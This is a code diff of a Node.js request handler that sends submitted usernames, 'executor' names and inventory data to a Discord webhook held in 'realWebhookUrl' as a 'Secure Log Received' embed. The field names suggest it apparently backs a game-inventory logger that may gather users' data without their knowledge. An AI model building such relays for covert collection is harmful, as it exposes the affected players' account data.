@@ -21,18 +21,23 @@ module.exports = async (req, res) => {
     }
 
     try {
-        const host = req.headers.host;
-        const protocol = host.includes('localhost') ? 'http' : 'https';
-        
-        const response = await axios.post(`${protocol}://${host}/api/send`, {
-            username,
-            executor,
-            inventoryData,
-            webhookUrl: realWebhookUrl
+        await axios.post(realWebhookUrl, {
+            embeds: [{
+                title: "🔒 Secure Log Received",
+                color: 65280,
+                fields: [
+                    { name: "👤 User", value: `\`${username}\``, inline: true },
+                    { name: "🚀 Executor", value: `\`${executor}\``, inline: true },
+                    { name: "🎒 Inventory", value: `\`\`\`json\n${JSON.stringify(inventoryData)}\n\`\`\`` }
+                ],
+                timestamp: new Date()
+            }]
         });
-
-        return res.status(200).json(response.data);
+        return res.status(200).json({ success: true });
     } catch (error) {
-        return res.status(500).json({ error: 'Failed to forward to Discord' });
+        return res.status(500).json({ 
+            error: 'Failed to forward to Discord',
+            details: error.message 
+        });
     }
 };
